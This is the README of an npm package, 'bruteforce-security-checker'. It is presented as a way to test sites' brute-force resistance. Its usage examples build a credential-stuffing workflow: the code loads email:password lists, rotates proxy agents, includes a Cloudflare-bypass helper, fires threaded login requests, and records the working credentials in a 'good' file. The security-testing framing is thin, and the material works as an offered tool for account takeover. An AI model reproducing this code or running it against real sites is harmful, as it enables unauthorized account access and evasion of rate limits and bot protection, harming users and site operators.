# bruteforce-security-checker

By this module you can:
1. Test site for bruteforce security by implement HTTP/WS login requests
2. Test site accessibility on mass user signups.


v1.1.4
- add new method **b.removeAccountsV2By** that >10x faster than **removeAccountsBy**
- add removing "\r" in b.loadAccounts because Windows are amazing :D

v1.1.32
- fixes with service.r


v1.1.3
- added "service.rCloudFlare" to bypass cloudflare


v1.1.22
- bug fixes with proxy types. Sometimes good one lib. Sometimes another "b.loadProxyAgents" or "b.loadProxyAgentsV2".


v1.1.2
- some updates to support backconnect proxies.
- changed proxy agent creation. Through "proxy-agent" lib now.


v1.1.1
- added https proxy support. Now 'http', 'https' and 'socks'.

## Table of contents

- [Installation](#installation)
- [Documentation](#documentation)
- [Bruteforce](#bruteforce)
- [Service](#service)
- [ProxyChecker](#proxyChecker)
- [Examples](#examples)
---

## Installation
```npm i @k7eon/bruteforce-security-checker --save```

## Documentation
For methods documentation visit [Doxdox generated docs](https://doxdox.org/k7eon/bruteforce-security-checker)

---------------------------------
# BruteForce
```js
const b = require('@k7eon/bruteforce-security-checker').bruteforce;
// or
const {bruteforce} = require('@k7eon/bruteforce-security-checker');
```

---------------------------------
# Service class
Service is a class with some usefully methods for implement HTTP request

```js
const Service = require('@k7eon/bruteforce-security-checker').Service;
// or
const {Service} = require('@k7eon/bruteforce-security-checker');
```

---------------------------------
# ProxyChecker
Return created class that are ready to check 'http' proxies from files:

usage:
```js
// someFile.js
const proxyChecker = require('@k7eon/bruteforce-security-checker').proxyChecker;
proxyChecker.run(
  'files/proxy.txt',
  'files/valid_proxies.txt',
  'http', // proxy type 'http' or 'https' or 'socks'
  100,    // threads,
  60000,  // timeout in ms
);
```

---------------------------------
## Examples


---------------------------------
#### Example of *Service* usage
```js
  // MySiteClass.js
  const Service = require('@k7eon/bruteforce-security-checker').Service;

  class MySiteClass extends Service {
    
    /**
    * if login success return cookies or null or throw HTTP layer exception;
    * @param login
    * @param password
    * @param agent      - socks proxy agent
    * @return {Promise<*>}
    */
    async login(login, password, agent=null) {
      let config = {
        method: 'POST',
        url: 'http://mysite.com/login',
        headers: {
          'accept':           'application/json, text/javascript, */*; q=0.01',
          'content-type':     'application/x-www-form-urlencoded; charset=UTF-8',
          'x-requested-with': 'XMLHttpRequest',
        },
        form: {
          'username': login,
          'password': password,
        },
        json: true,
      };
      let {response, body} = await this.r(config, agent);
      
      if (!body.success) return null;
      return this.getSetCookies(response);
    }
  }
  module.exports = new MySiteClass();
```
More about request configs [there](https://github.com/request/request)


---------------------------------
#### Example of *Bruteforce* with *MySiteClass*
```js
// login.js
const fs     = require('fs');
const b      = require('@k7eon/bruteforce-security-checker').bruteforce;
const mySite = require('./MySiteClass');
const FILE = {
  proxies:      'files/proxy_valid.txt',
  registered:   'files/registered.log',
  bad:          'files/bad.log',
  good:         'files/good.log',
  errors:       'files/errors_login.log',
};

b.createFilesIfNotExists(FILE);
b.loadAccounts(FILE.registered); // {email, password}[]
b.removeAccountsBy('email', [FILE.bad, FILE.good]);
b.loadProxyAgents(FILE.proxies);

b.showMetrics({'good':0, 'bad':0, 'errors':0}, 1000);

b.start({
  THREADS:      1,
  whatToQueue:  'accounts',
  useProxy:     true,
  // handlerFunc execute by every account
  handlerFunc: async (task, agent) => {
    /* workflow start */
    let account = task;
    console.log('account', account);
    let {email, password} = account;
    
    try {
      let cookie = await mySite.login(email, password, agent);

      if (!cookie) {
        console.log('bad');
        b.save(FILE.bad, email, 'bad');  
        return {agent};
      }
      
      console.log('good');
      b.save(FILE.good, [email, password].join(':'), 'good');  
      return {agent};
      
    } catch (e) {
      console.log('error', e);
      b.save(FILE.errors, `${JSON.stringify({account, proxy: agent.options.host})}\n${e.stack}\n`, 'errors');
      b.reCheck(account);
      return {agent};
    }
    /* end workflow */
  },
  drainCallback: () => {
    console.log('All accounts are checked');
  }
});
```
- Run ```node login.js```


